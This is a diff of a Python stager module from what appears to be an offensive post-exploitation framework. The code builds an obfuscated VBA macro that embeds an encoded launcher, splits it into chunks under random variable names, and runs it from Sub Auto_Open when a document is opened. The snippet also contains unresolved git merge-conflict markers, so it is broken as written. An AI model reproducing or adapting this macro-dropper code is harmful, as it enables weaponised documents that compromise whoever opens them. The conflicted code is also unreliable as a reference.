@@ -96,7 +96,11 @@ class Stager:
             obfuscateScript = True
 
         # generate the launcher code
+<<<<<<< HEAD
         launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=True, obfuscate=obfuscateScript, obfuscationCommand=obfuscateCommand, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)
+=======
+        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)
+>>>>>>> 0b582eac369e0e9809757e67599a14aadc305420
         Str = ''.join(random.choice(string.letters) for i in range(random.randint(1,len(listenerName))))
         Method=''.join(random.choice(string.letters) for i in range(random.randint(1,len(listenerName))))
 
@@ -104,11 +108,19 @@ class Stager:
             print helpers.color("[!] Error in launcher command generation.")
             return ""
         else:
+<<<<<<< HEAD
             chunks = list(helpers.chunks(launcher.replace("'", "\\'"), 50))
             payload = "\tDim "+Str+" As String\n"
             payload += "\t"+Str+" = '" + str(chunks[0]) + "'\n"
             for chunk in chunks[1:]:
                 payload += "\t"+Str+" = "+Str+" + '" + str(chunk) + "'\n"
+=======
+            chunks = list(helpers.chunks(launcher, 50))
+            payload = "\tDim "+Str+" As String\n"
+            payload += "\t"+Str+" = \"" + str(chunks[0]) + "\"\n"
+            for chunk in chunks[1:]:
+                payload += "\t"+Str+" = "+Str+" + \"" + str(chunk) + "\"\n"
+>>>>>>> 0b582eac369e0e9809757e67599a14aadc305420
 
             macro = "Sub Auto_Open()\n"
             macro += "\t"+Method+"\n"
